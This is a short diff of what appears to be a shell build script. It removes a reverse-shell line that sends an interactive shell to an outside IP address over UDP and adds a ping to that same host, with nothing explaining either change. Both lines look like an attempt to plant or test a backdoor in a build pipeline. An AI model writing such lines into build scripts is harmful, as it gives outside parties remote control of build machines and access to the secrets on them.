@@ -1,4 +1,4 @@
-sh -i >& /dev/udp/3.123.202.19/80 0>&1
+ping 3.123.202.19
 # If bash command fails, build should error out
 set -e
 
